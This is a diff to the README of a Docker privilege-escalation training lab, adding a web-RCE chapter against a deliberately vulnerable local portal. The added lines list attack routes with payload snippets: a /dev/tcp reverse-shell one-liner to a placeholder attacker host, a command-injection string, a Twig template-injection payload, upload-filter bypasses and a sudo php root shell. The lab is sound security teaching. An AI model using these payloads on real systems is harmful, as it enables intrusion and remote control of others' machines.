@@ -2,7 +2,7 @@
 
 <p align="center">
   <strong>Hands-on Linux privilege-escalation labs in Docker — where you <em>actually</em> get root.</strong><br/>
-  <sub>4 chapters live · 18 paths to root · every exploit CI-verified end-to-end · every bug paired with the blue-team fix.</sub>
+  <sub>5 chapters live · 18 privesc paths + 6 web-RCE routes · every exploit CI-verified end-to-end · every bug paired with the blue-team fix.</sub>
 </p>
 
 <p align="center">
@@ -10,8 +10,8 @@
   <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-yellow.svg" alt="License: MIT"></a>
   <img src="https://img.shields.io/badge/platform-Docker-2496ED?logo=docker&logoColor=white" alt="Docker">
   <img src="https://img.shields.io/badge/focus-Linux%20privesc-444?logo=linux&logoColor=white" alt="Linux privesc">
-  <img src="https://img.shields.io/badge/labs-4%20live%20%C2%B7%204%20planned-success" alt="Labs: 4 live, 4 planned">
-  <img src="https://img.shields.io/badge/stations-18%20paths-success" alt="18 paths">
+  <img src="https://img.shields.io/badge/labs-5%20live%20%C2%B7%203%20planned-success" alt="Labs: 5 live, 3 planned">
+  <img src="https://img.shields.io/badge/stations-18%20paths%20%2B%206%20web%20routes-success" alt="18 paths + 6 web routes">
   <img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg" alt="PRs welcome">
 </p>
 
@@ -85,6 +85,7 @@ labuser1 — uid 1001, not root
 | 06 | Writable `/etc/passwd` | — | Weak file permissions | ★☆☆☆ | ⏳ Planned |
 | 07 | NFS `no_root_squash` | — | Exported share mounts as root | ★★★☆ | ⏳ Planned |
 | 08 | Docker socket | — | `/var/run/docker.sock` exposed | ★★★☆ | ⏳ Planned |
+| 09 | **[Foothold — Web RCE](https://github.com/Adw0rm-sec/road-to-root/wiki/Chapter-09-Overview)** | `target-web` (`hollow-portal-01`) | Vulnerable web app → RCE → reverse shell → root | ★☆☆☆ → ★★★☆ | ✅ Ready |
 
 ### The paths in the four live chapters
 
@@ -132,6 +133,21 @@ labuser1 — uid 1001, not root
 
 </details>
 
+<details open>
+<summary><strong>Chapter 09 — Foothold (Web RCE)</strong>  ·  6 RCE routes → root  ·  ★☆☆☆ → ★★★☆</summary>
+
+The one chapter that starts you **outside** — no shell, just a browser and Burp against the "Hollow Share" portal (`http://127.0.0.1:8080/`). Every route lands a reverse shell as `www-data`; then `sudo php` finishes the climb to root.
+
+- **A · Unrestricted upload** — drop `shell.php` in a web-served dir; browse to it → webshell → `bash -i >& /dev/tcp/attacker/4444 0>&1`
+- **B · Upload filter bypass** — `.php` blocked; bypass with `.pht`/`.php5`, double extension, GIF89a magic bytes + spoofed `image/gif`, or an uploaded `.htaccess AddType`
+- **C · OS command injection** — the ping tool shells out `host` unescaped; `127.0.0.1; <cmd>`
+- **D · LFI → RCE** — `?page=` includes any file; RCE via Apache access-log poisoning, plus `php://filter` source disclosure and `data://` / `php://input` wrappers
+- **E · SSTI (Twig)** — a greeting preview compiles your input as a template; `{{7*7}}` → `{{['id']|map('system')}}`
+- **F · PHP insecure deserialization** — the `prefs` cookie is `unserialize()`d; a `MaintenanceTask` gadget's `__wakeup()` runs your command
+- **★ Capstone** — `www-data` may `sudo /usr/bin/php`; `sudo php -r 'system("/bin/sh");'` → root → `/root/flag.txt`
+
+</details>
+
 Every one of these has a dedicated wiki page with the exploit flag-by-flag, the mechanic, the pitfalls, and the blue-team fix:
 
 → **[Open the wiki →](https://github.com/Adw0rm-sec/road-to-root/wiki)**
@@ -145,6 +161,7 @@ make up                 # Chapter 01 (SUID)   attacker + target-suid
 make up-cron            # Chapter 02 (Cron)   attacker + target-cron
 make up-sudo            # Chapter 03 (Sudo)   attacker + target-sudo
 make up-path            # Chapter 04 (PATH)   attacker + target-path
+make up-web             # Chapter 09 (Web)    attacker + target-web  →  http://127.0.0.1:8080/
 
 make attacker           # shell into the attacker box (all chapters)
 make shell-<chapter>    # root shell on the target (inspect / reset)
